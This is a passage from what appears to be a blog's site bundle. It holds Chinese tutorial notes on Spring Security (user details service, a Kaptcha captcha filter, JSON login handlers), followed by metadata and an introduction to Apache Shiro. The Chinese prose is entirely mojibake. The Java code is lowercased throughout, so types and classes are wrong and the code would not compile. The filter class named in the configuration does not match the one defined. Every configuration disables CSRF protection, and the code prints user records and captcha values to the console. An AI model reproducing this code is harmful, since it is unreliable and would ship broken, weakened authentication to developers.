org.springframework.security.core.userdetails.userdetails;\n\nimport java.util.arraylist;\nimport java.util.collection;\nimport java.util.list;\n\n@data\n@allargsconstructor\n@noargsconstructor\npublic class user implements userdetails {\n    private integer id;\n    private string username;\n    private string password;\n    private boolean enabled;\n    private boolean accountnonexpired;\n    private boolean accountnonlocked;\n    private boolean credentialsnonexpired;\n    private list<role> roles = new arraylist<>();\n\n    @override\n    public collection<? extends grantedauthority> getauthorities() {\n        list<grantedauthority> grantedauthorities = new arraylist<>();\n        roles.foreach(role->grantedauthorities.add(new simplegrantedauthority(role.getname())));\n        return grantedauthorities;\n    }\n\n    @override\n    public string getpassword() {\n        return password;\n    }\n\n    @override\n    public string getusername() {\n        return username;\n    }\n\n    @override\n    public boolean isaccountnonexpired() {\n        return accountnonexpired;\n    }\n\n    @override\n    public boolean isaccountnonlocked() {\n        return accountnonlocked;\n    }\n\n    @override\n    public boolean iscredentialsnonexpired() {\n        return credentialsnonexpired;\n    }\n\n    @override\n    public boolean isenabled() {\n        return enabled;\n    }\n\t\t//get/set....\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\nè§è²å¯¹è±¡\n\npackage com.pwddd.springsecurity.entity;\n\nimport lombok.*;\nimport org.springframework.context.annotation.scope;\n\n@data\n@allargsconstructor\n@noargsconstructor\npublic class role {\n    private integer id;\n    private string name;\n    private string namezh;\n  \t//get set..\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nåå»ºå¯¹åºçservice\n\npackage com.pwddd.springsecurity.service.impl;\n\nimport com.pwddd.springsecurity.entity.user;\nimport com.pwddd.springsecurity.mapper.usermapper;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.security.core.userdetails.userdetails;\nimport org.springframework.security.core.userdetails.userdetailsservice;\nimport org.springframework.security.core.userdetails.usernamenotfoundexception;\nimport org.springframework.stereotype.service;\nimport org.springframework.util.objectutils;\n\n@service\npublic class userserviceimpl implements userdetailsservice {\n    @autowired\n    private  usermapper userdao;\n\n\n    @override\n    public userdetails loaduserbyusername(string username) throws usernamenotfoundexception {\n        user user = userdao.loaduserbyusername(username);\n        if(objectutils.isempty(user))throw new runtimeexception("ç¨æ·ä¸å­å¨");\n        user.setroles(userdao.getrolesbyuid(user.getid()));\n        return user;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\nä½¿ç¨è¯¥service\n\n@autowired\nprivate userserviceimpl userservice;\n\n\n\n@override\nprotected void configure(authenticationmanagerbuilder builder) throws exception {\n  builder.userdetailsservice(userservice);\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# éªè¯ç æ¡ä¾\n\n# ä¼ ç»webæ¡ä¾\n\n 0. åå»ºä¸ä¸ªæ°é¡¹ç®ï¼å¼å¥webç¸å³ä¾èµï¼æµè¯ç¯å¢ãå¼å¥spring securityä½¿ç¨é»è®¤æ¦æªæµè¯ã\n\n 1. èªå®ä¹springsecurityéç½®ã\n\n   package com.pwddd.web.conf;\n   \n   import org.springframework.context.annotation.configuration;\n   import org.springframework.security.config.annotation.web.builders.httpsecurity;\n   import org.springframework.security.config.annotation.web.configuration.websecurityconfigureradapter;\n   \n   @configuration\n   public class securityconfig extends websecurityconfigureradapter {\n     @override\n     protected void configure(httpsecurity http) throws exception {\n       http.authorizerequests()\n         //                .mvcmatchers("/test").permitall()\n         .mvcmatchers("/login").permitall()\n         .mvcmatchers("/dologin").permitall()\n         .anyrequest().authenticated()\n         .and()\n         .formlogin()\n         .loginpage("/login")\n         .defaultsuccessurl("/index")\n         .failureurl("/login")\n         .usernameparameter("uname")\n         .passwordparameter("passwd")\n         .loginprocessingurl("/dologin")\n         .and().csrf().disable();\n     }\n   }\n   \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n 2. èªå®ä¹æ°æ®æº\n\n   package com.pwddd.web.service;\n   \n   import com.pwddd.web.entity.user;\n   import com.pwddd.web.mapper.usermapper;\n   import org.springframework.beans.factory.annotation.autowired;\n   import org.springframework.security.core.userdetails.userdetails;\n   import org.springframework.security.core.userdetails.userdetailsservice;\n   import org.springframework.security.core.userdetails.usernamenotfoundexception;\n   import org.springframework.stereotype.component;\n   import org.springframework.stereotype.service;\n   \n   @service\n   public class userservice implements userdetailsservice {\n   \n       private final usermapper usermapper;\n   \n       public userservice(usermapper usermapper) {\n           this.usermapper = usermapper;\n       }\n   \n       @override\n       public userdetails loaduserbyusername(string username) throws usernamenotfoundexception {\n           user user = usermapper.loaduserbyusername(username);\n           system.out.println(user);\n           if (user == null) throw new usernamenotfoundexception("ç¨æ·åä¸æ­£ç¡®");\n           return user;\n       }\n   }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n   package com.pwddd.web.conf;\n   \n   import com.pwddd.web.service.userservice;\n   import org.springframework.context.annotation.configuration;\n   import org.springframework.security.config.annotation.authentication.builders.authenticationmanagerbuilder;\n   import org.springframework.security.config.annotation.web.builders.httpsecurity;\n   import org.springframework.security.config.annotation.web.configuration.websecurityconfigureradapter;\n   import org.springframework.security.core.userdetails.userdetailsservice;\n   \n   @configuration\n   public class securityconfig extends websecurityconfigureradapter {\n   \n       private final userservice userservice;\n   \n       public securityconfig(userservice userservice) {\n           this.userservice = userservice;\n       }\n   \n       @override\n       protected userdetailsservice userdetailsservice() {\n           return userservice;\n       }\n   \n       @override\n       protected void configure(authenticationmanagerbuilder auth) throws exception {\n           auth.userdetailsservice(userdetailsservice());\n       }\n   \n       @override\n       protected void configure(httpsecurity http) throws exception {\n           http.authorizerequests()\n   //                .mvcmatchers("/test").permitall()\n                   .mvcmatchers("/login").permitall()\n                   .mvcmatchers("/dologin").permitall()\n                   .anyrequest().authenticated()\n                   .and()\n                   .formlogin()\n                   .loginpage("/login")\n                   .defaultsuccessurl("/index")\n                   .failureurl("/login")\n                   .usernameparameter("uname")\n                   .passwordparameter("passwd")\n                   .loginprocessingurl("/dologin")\n                   .and().csrf().disable();\n       }\n   }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n 3. çæéªè¯ç \n\n<dependency>\n  <groupid>com.github.penggle</groupid>\n  <artifactid>kaptcha</artifactid>\n  <version>2.3.2</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\npackage com.pwddd.web.conf;\n\nimport com.google.code.kaptcha.producer;\nimport com.google.code.kaptcha.impl.defaultkaptcha;\nimport com.google.code.kaptcha.util.config;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\nimport java.util.properties;\n\n@configuration\npublic class kaptchaconfig {\n\n  @bean\n  public producer kaptcha() {\n    properties properties = new properties();\n    properties.setproperty("kaptcha.image.width", "150");\n    properties.setproperty("kaptcha.image.height", "50");\n\n    properties.setproperty("kaptcha.textproducer.char.string", "0123456789");\n    properties.setproperty("kaptcha.textproducer.char.length", "4");\n    config config = new config(properties);\n    defaultkaptcha defaultkaptcha = new defaultkaptcha();\n    defaultkaptcha.setconfig(config);\n    return defaultkaptcha;\n  }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\nçæéªè¯ç \n\n@requestmapping("/code")\npublic void verify(httpservletresponse resp, httpsession session) throws ioexception {\n  resp.setcontenttype("image/png");\n  string code = producer.createtext();\n  session.setattribute("code",code);\n  bufferedimage image = producer.createimage(code);\n  servletoutputstream outputstream = resp.getoutputstream();\n  imageio.write(image,"png",outputstream);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\næ·»å å°é¡µé¢\n\néªè¯ç ï¼ <input type="text" name="code"> <img th:src="@{/code}" alt="éªè¯ç " /> <br>\n\n\n1\n\n\nèªå®ä¹éªè¯ç å¼å¸¸\n\npackage com.pwddd.web.ex;\n\n\nimport org.springframework.security.core.authenticationexception;\n\npublic class captchanotmatchexception extends authenticationexception {\n  public captchanotmatchexception(string msg) {\n    super(msg);\n  }\n\n  public captchanotmatchexception(string msg, throwable cause) {\n    super(msg, cause);\n  }\n\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nå¤çæºå¸¦éªè¯ç çè¯·æ±ï¼èªå®ä¹filter\n\npackage com.pwddd.web.filter;\n\nimport com.pwddd.web.ex.captchanotmatchexception;\nimport org.springframework.security.core.authentication;\nimport org.springframework.security.core.authenticationexception;\nimport org.springframework.security.web.authentication.usernamepasswordauthenticationfilter;\nimport org.springframework.util.objectutils;\n\nimport javax.servlet.http.httpservletrequest;\nimport javax.servlet.http.httpservletresponse;\n\npublic class customerfilter extends usernamepasswordauthenticationfilter {\n  public static final string spring_security_form_code_key = "code";\n  private string codeparameter = spring_security_form_code_key;\n\n  public string getcodeparameter() {\n    return codeparameter;\n  }\n\n  public void setcodeparameter(string codeparameter) {\n    this.codeparameter = codeparameter;\n  }\n\n  @override\n  public authentication attemptauthentication(httpservletrequest request, httpservletresponse response) throws authenticationexception {\n\n    string code = request.getparameter(getcodeparameter());\n    string sessioncode = (string) request.getsession().getattribute(getcodeparameter());\n    if (!objectutils.isempty(code)\n        && !objectutils.isempty(sessioncode)\n        && code.equals(sessioncode)\n       ){\n      return super.attemptauthentication(request,response);\n    }\n    throw new captchanotmatchexception("éªè¯ç éè¯¯");\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\næ¿æ¢æé»è®¤çusernamepasswordauthenticationfilter\n\npackage com.pwddd.web.config;\n\nimport com.pwddd.web.filter.imagecodefilter;\nimport com.pwddd.web.service.userservice;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.security.config.annotation.authentication.builders.authenticationmanagerbuilder;\nimport org.springframework.security.config.annotation.web.builders.httpsecurity;\nimport org.springframework.security.config.annotation.web.configuration.websecurityconfigureradapter;\nimport org.springframework.security.core.userdetails.userdetailsservice;\nimport org.springframework.security.web.authentication.usernamepasswordauthenticationfilter;\n\n@configuration\npublic class securityconfig extends websecurityconfigureradapter {\n\n  private final userservice userservice;\n\n  public securityconfig(userservice userservice) {\n    this.userservice = userservice;\n  }\n\n  @override\n  protected void configure(authenticationmanagerbuilder auth) throws exception {\n    auth.userdetailsservice(userdetailsservice());\n  }\n\n  @override\n  protected userdetailsservice userdetailsservice() {\n    return userservice;\n  }\n\n  @bean\n  imagecodefilter imagecodefilter() throws exception {\n    imagecodefilter imagecodefilter = new imagecodefilter();\n    imagecodefilter.setcodeparameter("code");\n    imagecodefilter.setpasswordparameter("passwd");\n    imagecodefilter.setusernameparameter("uname");\n    imagecodefilter.setfilterprocessesurl("/dologin");\n    imagecodefilter.setauthenticationmanager(authenticationmanager());\n    return imagecodefilter;\n  }\n\n  @override\n  protected void configure(httpsecurity http) throws exception {\n    http.authorizerequests()\n      .mvcmatchers("/code").permitall()\n      .mvcmatchers("/login").permitall()\n      .mvcmatchers("/dologin").permitall()\n      .anyrequest().authenticated()\n      .and()\n      .formlogin()\n      .loginpage("/login")\n      .successforwardurl("/index")\n      .and()\n      .csrf().disable();\n    http.addfilterat(imagecodefilter(), usernamepasswordauthenticationfilter.class);\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n\n\n# ååç«¯åç¦»æ¡ä¾\n\n 0. åå»ºååç«¯åç¦»é¡¹ç®ï¼å¼å¥ç¸å³ä¾èµï¼æµè¯ç¯å¢ã\n\n 1. èªå®ä¹æ°æ®æºãåä¸é¢çå¹¶æ²¡æä»ä¹ä¸åã\n\n 2. èªå®ä¹æåå¤çå¨åå¤±è´¥å¤çå¨ä»¥åæ æéç»å½ååºã\n\n@configuration\npublic class securityconfig extends websecurityconfigureradapter {\n\n\n  private final userservice userservice;\n\n  @autowired\n  public securityconfig(userservice userservice) {\n    this.userservice = userservice;\n  }\n\n  @override\n  protected userdetailsservice userdetailsservice() {\n    return userservice;\n  }\n\n  @override\n  protected void configure(httpsecurity http) throws exception {\n    http.authorizerequests()\n      .anyrequest().authenticated()\n      .and()\n      .formlogin()\n      .successhandler(((request, response, authentication) -> {\n        response.setcontenttype("application/json;charset=utf-8");\n        hashmap<string, object> result = new hashmap<>();\n        result.put("msg","ç»å½æåï¼");\n        result.put("code",200);\n        string resultjson = new objectmapper().writevalueasstring(result);\n        response.getwriter().write(resultjson);\n      }))\n      .failurehandler(((request, response, exception) -> {\n        response.setcontenttype("application/json;charset=utf-8");\n        hashmap<string, object> result = new hashmap<>();\n        result.put("msg","ç»å½å¤±è´¥ï¼");\n        result.put("code",401);\n        string resultjson = new objectmapper().writevalueasstring(result);\n        response.getwriter().write(resultjson);\n      }))\n      .and()\n      .exceptionhandling()\n      .authenticationentrypoint(((request, response, accessdeniedexception) -> {\n        response.setcontenttype("application/json;charset=utf-8");\n        hashmap<string, object> result = new hashmap<>();\n        result.put("msg","æ æéè®¿é®ï¼");\n        result.put("code",403);\n        string resultjson = new objectmapper().writevalueasstring(result);\n        response.getwriter().write(resultjson);\n\n      }))\n      .and().csrf().disable();\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n 3. èªå®ä¹éªè¯ç å¤çï¼åä¸é¢ä¸æ ·ã\n\nçæéªè¯ç å¹¶è¾åºbase64\n\n@getmapping("code")\npublic string code(httpsession session) throws ioexception {\n  string text = producer.createtext();\n  system.out.println(text);\n  session.setattribute(new imagecodefilter().getcodeparameter(),text);\n  bufferedimage image = producer.createimage(text);\n  bytearrayoutputstream bos = new bytearrayoutputstream();\n  imageio.write(image,"png",bos);\n  return base64.encodebase64string(bos.tobytearray());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n@configuration\npublic class securityconfig extends websecurityconfigureradapter {\n\nâ¦â¦â¦â¦\n  @bean\n  public imagecodefilter imagecodefilter() throws exception {\n    imagecodefilter imagecodefilter = new imagecodefilter();\n    imagecodefilter.setcodeparameter("code");\n    imagecodefilter.setusernameparameter("uname");\n    imagecodefilter.setpasswordparameter("passwd");\n    imagecodefilter.setauthenticationmanager(authenticationmanager());\n    return imagecodefilter;\n  }\n\n\n  @override\n  protected void configure(httpsecurity http) throws exception {\n    http.authorizerequests()\n      .mvcmatchers("/code").permitall()\n\n      â¦â¦â¦â¦\n    http.addfilterat(imagecodefilter(), usernamepasswordauthenticationfilter.class);\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# å¯ç å å¯\n\n\n# rememberme\n\n\n# ä¼è¯ç®¡ç\n\n\n# csrf',charsets:{cjk:!0},lastUpdated:"2022/04/25, 00:33:18",lastUpdatedTimestamp:1650846798e3},{title:"Shiro",frontmatter:{title:"Shiro",date:"2022-04-15T00:00:00.000Z",permalink:"/dev/java/eco/shiro",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","å¾®æå¡çæ"],tags:["Springboot","Shiro"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1012.%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%94%9F%E6%80%81/02.Shiro.html",relativePath:"01.å¼å/101.åç«¯/1012.å¾®æå¡çæ/02.Shiro.md",key:"v-f9d6b4e4",path:"/dev/java/eco/shiro/",headers:[{level:2,title:"æéç®¡ç",slug:"æéç®¡ç",normalizedTitle:"æéç®¡ç",charIndex:119},{level:3,title:"æéç®¡ççæ¦å¿µ",slug:"æéç®¡ççæ¦å¿µ",normalizedTitle:"æéç®¡ççæ¦å¿µ",charIndex:128},{level:3,title:"èº«ä»½è®¤è¯çæ¦å¿µ",slug:"èº«ä»½è®¤è¯çæ¦å¿µ",normalizedTitle:"èº«ä»½è®¤è¯çæ¦å¿µ",charIndex:302},{level:3,title:"ææçæ¦å¿µ",slug:"ææçæ¦å¿µ",normalizedTitle:"ææçæ¦å¿µ",charIndex:444},{level:2,title:"Shiroçç®ä»",slug:"shiroçç®ä»",normalizedTitle:"shiroçç®ä»",charIndex:518},{level:3,title:"Shiroçæ ¸å¿æ¶æ",slug:"shiroçæ ¸å¿æ¶æ",normalizedTitle:"shiroçæ ¸å¿æ¶æ",charIndex:1059},{level:2,title:"Shiroè®¤è¯",slug:"shiroè®¤è¯",normalizedTitle:"shiroè®¤è¯",charIndex:2292},{level:3,title:"è®¤è¯çç¸å³å¯¹è±¡",slug:"è®¤è¯çç¸å³å¯¹è±¡",normalizedTitle:"è®¤è¯çç¸å³å¯¹è±¡",charIndex:2401},{level:3,title:"è®¤è¯çæµç¨",slug:"è®¤è¯çæµç¨",normalizedTitle:"è®¤è¯çæµç¨",charIndex:2611},{level:3,title:"å®ç°ä¸ä¸ªæç®åçè®¤è¯",slug:"å®ç°ä¸ä¸ªæç®åçè®¤è¯",normalizedTitle:"å®ç°ä¸ä¸ªæç®åçè®¤è¯",charIndex:2623},{level:3,title:"æºç è¿½è¸ªshiroä¸­çè®¤è¯è¿ç¨",slug:"æºç è¿½è¸ªshiroä¸­çè®¤è¯è¿ç¨",normalizedTitle:"æºç è¿½è¸ªshiroä¸­çè®¤è¯è¿ç¨",charIndex:5139},{level:3,title:"èªå®ä¹çRealm",slug:"èªå®ä¹çrealm",normalizedTitle:"èªå®ä¹çrealm",charIndex:7908},{level:2,title:"Shiroææ",slug:"shiroææ",normalizedTitle:"shiroææ",charIndex:17398},{level:3,title:"Shiro ææçå³é®å¯¹è±¡",slug:"shiro-ææçå³é®å¯¹è±¡",normalizedTitle:"shiro ææçå³é®å¯¹è±¡",charIndex:17476},{level:3,title:"ææçæµç¨",slug:"ææçæµç¨",normalizedTitle:"ææçæµç¨",charIndex:17743},{level:3,title:"ææçæ¹å¼",slug:"ææçæ¹å¼",normalizedTitle:"ææçæ¹å¼",charIndex:17755},{level:3,title:"æéå­ç¬¦ä¸²",slug:"æéå­ç¬¦ä¸²",normalizedTitle:"æéå­ç¬¦ä¸²",charIndex:18170},{level:3,title:"ææå®ç°æ¹å¼",slug:"ææå®ç°æ¹å¼",normalizedTitle:"ææå®ç°æ¹å¼",charIndex:18364},{level:3,title:"å¼åå®ç°",slug:"å¼åå®ç°",normalizedTitle:"å¼åå®ç°",charIndex:18716},{level:2,title:"æ´åSpringboot",slug:"æ´åspringboot",normalizedTitle:"æ´åspringboot",charIndex:22742},{level:3,title:"æ´åçæè·¯",slug:"æ´åçæè·¯",normalizedTitle:"æ´åçæè·¯",charIndex:22759},{level:3,title:"æ´åçæ­¥éª¤",slug:"æ´åçæ­¥éª¤",normalizedTitle:"æ´åçæ­¥éª¤",charIndex:22771},{level:2,title:"åèèµæ",slug:"åèèµæ",normalizedTitle:"åèèµæ",charIndex:55848}],excerpt:'<h1 id="shiro"><a class="header-anchor" href="#shiro">#</a> Shiro</h1>\n<p>Shiro æ¯ä¸ä¸ªåè½å¼ºå¤§ä¸æäºä½¿ç¨çJavaå®å¨æ¡æ¶ï¼å®æ§è¡èº«ä»½éªè¯ãææãå å¯åä¼è¯ç®¡çãä½¿ç¨Shiroæäºçè§£çAPIï¼æ¨å¯ä»¥å¿«éè½»æ¾å°ä¿æ¤ä»»ä½åºç¨ç¨åºâä»æå°çç§»å¨åºç¨ç¨åºå°æå¤§çwebåä¼ä¸åºç¨ç¨åºã</p>\n',headersStr:"æéç®¡ç æéç®¡ççæ¦å¿µ èº«ä»½è®¤è¯çæ¦å¿µ ææçæ¦å¿µ Shiroçç®ä» Shiroçæ ¸å¿æ¶æ Shiroè®¤è¯ è®¤è¯çç¸å³å¯¹è±¡ è®¤è¯çæµç¨ å®ç°ä¸ä¸ªæç®åçè®¤è¯ æºç è¿½è¸ªshiroä¸­çè®¤è¯è¿ç¨ èªå®ä¹çRealm Shiroææ Shiro ææçå³é®å¯¹è±¡ ææçæµç¨ ææçæ¹å¼ æéå­ç¬¦ä¸² ææå®ç°æ¹å¼ å¼åå®ç° æ´åSpringboot æ´åçæè·¯ æ´åçæ­¥éª¤ åèèµæ",content:'# Shiro\n\nShiro æ¯ä¸ä¸ªåè½å¼ºå¤§ä¸æäºä½¿ç¨çJavaå®å¨æ¡æ¶ï¼å®æ§è¡èº«ä»½éªè¯ãææãå å¯åä¼è¯ç®¡çãä½¿ç¨Shiroæäºçè§£çAPIï¼æ¨å¯ä»¥å¿«éè½»æ¾å°ä¿æ¤ä»»ä½åºç¨ç¨åºâä»æå°çç§»å¨åºç¨ç¨åºå°æå¤§çwebåä¼ä¸åºç¨ç¨åºã\n\n\n# æéç®¡ç\n\n\n# æéç®¡ççæ¦å¿µ\n\nåºæ¬ä¸æ¶åå°ç¨æ·åä¸çç³»ç»é½è¦è¿è¡æéç®¡çï¼æéç®¡çå±äºç³»ç»å®å¨çèç´ï¼æéç®¡çå®ç°å¯¹ç¨æ·è®¿é®ç³»ç»çæ§å¶ï¼æç§å®å¨è§åæèå®å¨ç­ç¥æ§å¶ç¨æ·å¯ä»¥è®¿é®èä¸åªè½è®¿é®èªå·±è¢«ææçèµæºã\n\næéç®¡çåæ¬ç¨æ·èº«ä»½è®¤è¯åææä¸¤é¨åï¼ç®ç§°è®¤è¯ææãå¯¹äºéè¦è®¿é®æ§å¶çèµæºç¨æ·é¦åç»è¿èº«ä»½è®¤è¯ï¼è®¤è¯éè¿åç¨æ·å·æè¯¥èµæºçè®¿é®æéæ¹å¯è®¿é®ã\n\n\n# èº«ä»½è®¤è¯çæ¦å¿µ\n\nèº«ä»½è®¤è¯ï¼å°±æ¯å¤æ­ä¸ä¸ªç¨æ·æ¯å¦ä¸ºåæ³ç¨æ·çå¤çè¿ç¨ãæå¸¸ç¨çç®åèº«ä»½è®¤è¯æ¹å¼æ¯ç³»ç»éè¿æ ¸å¯¹ç¨æ·è¾å¥çç¨æ·ååå£ä»¤ï¼çå¶æ¯å¦ä¸ç³»ç»ä¸­å­å¨çè¯¥ç¨æ·çç¨æ·ååå£ä»¤ä¸è´ï¼æ¥å¤æ­ç¨æ·èº«ä»½æ¯å¦æ­£ç¡®ãå¯¹äºéç¨æçº¹ç­ç³»ç»ï¼ååºç¤ºæçº¹ï¼å¯¹äºç¡¬ä»¶Keyç­å·å¡ç³»ç»ï¼åéè¦å·å¡ã\n\n\n# ææçæ¦å¿µ\n\nææï¼å³è®¿é®æ§å¶ï¼æ§å¶è°è½è®¿é®åªäºèµæºãä¸»ä½è¿è¡èº«ä»½è®¤è¯åéè¦åéæéæ¹å¯è®¿é®ç³»ç»çèµæºï¼å¯¹äºæäºèµæºæ²¡ææéæ¯æ æ³è®¿é®çã\n\n\n# Shiroçç®ä»\n\n> Apache Shiroâ¢ is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management. With Shiroâs easy-to-understand API, you can quickly and easily secure any application â from the smallest mobile applications to the largest web and enterprise applications.\n> \n> Shiro æ¯ä¸ä¸ªåè½å¼ºå¤§ä¸æäºä½¿ç¨çJavaå®å¨æ¡æ¶ï¼å®æ§è¡èº«ä»½éªè¯ãææãå å¯åä¼è¯ç®¡çãä½¿ç¨Shiroæäºçè§£çAPIï¼æ¨å¯ä»¥å¿«éè½»æ¾å°ä¿æ¤ä»»ä½åºç¨ç¨åºâä»æå°çç§»å¨åºç¨ç¨åºå°æå¤§çwebåä¼ä¸åºç¨ç¨åºã\n> \n> Shiroæ¯apacheæä¸ä¸ä¸ªå¼æºæ¡æ¶ï¼å®å°è½¯ä»¶ç³»ç»çå®å¨è®¤è¯ç¸å³çåè½æ½ååºæ¥ï¼å®ç°ç¨æ·èº«ä»½è®¤è¯ï¼æéææãå å¯ãä¼è¯ç®¡çç­åè½ï¼ç»æäºä¸ä¸ªéç¨çå®å¨è®¤è¯æ¡æ¶ã\n\n\n# Shiroçæ ¸å¿æ¶æ\n\n\n\n# subject\n\nSubjectå³ä¸»ä½ï¼å¤é¨åºç¨ä¸subjectè¿è¡äº¤äºï¼subjectè®°å½äºå½åæä½ç¨æ·ï¼å°ç¨æ·çæ¦å¿µçè§£ä¸ºå½åæä½çä¸»ä½ï¼å¯è½æ¯ä¸ä¸ªéè¿æµè§å¨è¯·æ±çç¨æ·ï¼ä¹å¯è½æ¯ä¸ä¸ªè¿è¡çç¨åºãSubjectå¨shiroä¸­æ¯ä¸ä¸ªæ¥å£ï¼æ¥å£ä¸­å®ä¹äºå¾å¤è®¤è¯æç¸å³çæ¹æ³ï¼å¤é¨ç¨åºéè¿subjectè¿è¡è®¤è¯æï¼èsubjectæ¯éè¿SecurityManagerå®å¨ç®¡çå¨è¿è¡è®¤è¯ææã\n\n# securityManager\n\nSecurityManagerå³å®å¨ç®¡çå¨ï¼å¯¹å¨é¨çsubjectè¿è¡å®å¨ç®¡çï¼å®æ¯shiroçæ ¸å¿ï¼è´è´£å¯¹ææçsubjectè¿è¡å®å¨ç®¡çãéè¿SecurityManagerå¯ä»¥å®æsubjectçè®¤è¯ãææç­ï¼å®è´¨ä¸SecurityManageræ¯éè¿Authenticatorè¿è¡è®¤è¯ï¼éè¿Authorizerè¿è¡ææï¼éè¿SessionManagerè¿è¡ä¼è¯ç®¡çç­ã\n\nSecurityManageræ¯ä¸ä¸ªæ¥å£ï¼ç»§æ¿äºAuthenticator, Authorizer, SessionManagerè¿ä¸ä¸ªæ¥å£ã\n\n# Authenticator\n\nAuthenticatorå³è®¤è¯å¨ï¼å¯¹ç¨æ·èº«ä»½è¿è¡è®¤è¯ï¼Authenticatoræ¯ä¸ä¸ªæ¥å£ï¼shiroæä¾ModularRealmAuthenticatorå®ç°ç±»ï¼éè¿ModularRealmAuthenticatoråºæ¬ä¸å¯ä»¥æ»¡è¶³å¤§å¤æ°éæ±ï¼ä¹å¯ä»¥èªå®ä¹è®¤è¯å¨ã\n\n# Authorizer\n\nAuthorizerå³ææå¨ï¼ç¨æ·éè¿è®¤è¯å¨è®¤è¯éè¿ï¼å¨è®¿é®åè½æ¶éè¦éè¿ææå¨å¤æ­ç¨æ·æ¯å¦ææ­¤åè½çæä½æéã\n\n# Realm\n\nRealmå³é¢åï¼ç¸å½äºdatasourceæ°æ®æºï¼securityManagerè¿è¡å®å¨è®¤è¯éè¦éè¿Realmè·åç¨æ·æéæ°æ®ï¼æ¯å¦ï¼å¦æç¨æ·èº«ä»½æ°æ®å¨æ°æ®åºé£ä¹realmå°±éè¦ä»æ°æ®åºè·åç¨æ·èº«ä»½ä¿¡æ¯ã\n\næ³¨æï¼ä¸è¦ærealmçè§£æåªæ¯ä»æ°æ®æºåæ°æ®ï¼å¨realmä¸­è¿æè®¤è¯æææ ¡éªçç¸å³çä»£ç ã\n\n# SessionManager\n\nsessionManagerå³ä¼è¯ç®¡çï¼shiroæ¡æ¶å®ä¹äºä¸å¥ä¼è¯ç®¡çï¼å®ä¸ä¾èµwebå®¹å¨çsessionï¼æä»¥shiroå¯ä»¥ä½¿ç¨å¨éwebåºç¨ä¸ï¼ä¹å¯ä»¥å°åå¸å¼åºç¨çä¼è¯éä¸­å¨ä¸ç¹ç®¡çï¼æ­¤ç¹æ§å¯ä½¿å®å®ç°åç¹ç»å½ã\n\n# SessionDAO\n\nSessionDAOå³ä¼è¯daoï¼æ¯å¯¹sessionä¼è¯æä½çä¸å¥æ¥å£ï¼æ¯å¦è¦å°sessionå­å¨å°æ°æ®åºï¼å¯ä»¥éè¿jdbcå°ä¼è¯å­å¨å°æ°æ®åºã\n\n# CacheManager\n\nCacheManagerå³ç¼å­ç®¡çï¼å°ç¨æ·æéæ°æ®å­å¨å¨ç¼å­ï¼è¿æ ·å¯ä»¥æé«æ§è½ã\n\n# Cryptography\n\nCryptographyå³å¯ç ç®¡çï¼shiroæä¾äºä¸å¥å å¯/è§£å¯çç»ä»¶ï¼æ¹ä¾¿å¼åãæ¯å¦æä¾å¸¸ç¨çæ£åãå /è§£å¯ç­åè½ã\n\n\n# Shiroè®¤è¯\n\n> 